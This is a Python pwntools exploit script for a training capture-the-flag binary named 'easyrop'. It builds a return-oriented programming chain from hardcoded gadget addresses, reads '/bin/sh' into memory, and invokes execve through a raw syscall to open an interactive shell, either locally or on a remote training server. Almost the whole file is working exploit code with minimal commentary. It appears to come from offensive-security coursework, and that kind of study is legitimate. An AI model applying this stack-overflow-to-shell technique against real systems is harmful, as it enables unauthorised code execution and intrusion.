from pwn import *
import time

CHALL_PATH = "./easyrop"
CHALL = ELF(CHALL_PATH)
COMMANDS = """
b main
b *0x401162
c
"""

def send_to_read(address):
    part1 = address & 0xffffffff # Extract the least significant 4 bytes
    part2 = address >> 32 # Get the other bytes
    c.send(p32(part1))
    c.send(p32(0))
    c.send(p32(part2))
    c.send(p32(0))

context.arch = "amd64"

if args.GDB:
    c = gdb.debug(CHALL_PATH, COMMANDS)
elif args.REM:
    c = remote("easyrop.training.offensivedefensive.it", 8080, ssl=True)
else:
    c = process(CHALL_PATH)

input("wait")

# IDEA: Insert values for registers in stack, overwrite RIP and jump

#c.recvuntil(b"!\n")

cleaner = 0x40108e
reader = 0x40107b
bin = 0x403000
syscall = 0x401028

rop_chain = [0x0] * 7

rop_chain += [
    cleaner,
    0, #rdi
    bin, #rsi
    8, #rdx
    0, #rax
    reader,
    0,
    cleaner,
    bin, #rdi
    0, #rdx
    0, #rsi
    0x3b, #rax
    syscall
]

#0x7ffc363eeb58

for address in rop_chain:
    send_to_read(address)



c.send("\n")
time.sleep(0.1)
c.send("\n")
time.sleep(0.1)

c.send("/bin/sh\x00")



c.interactive()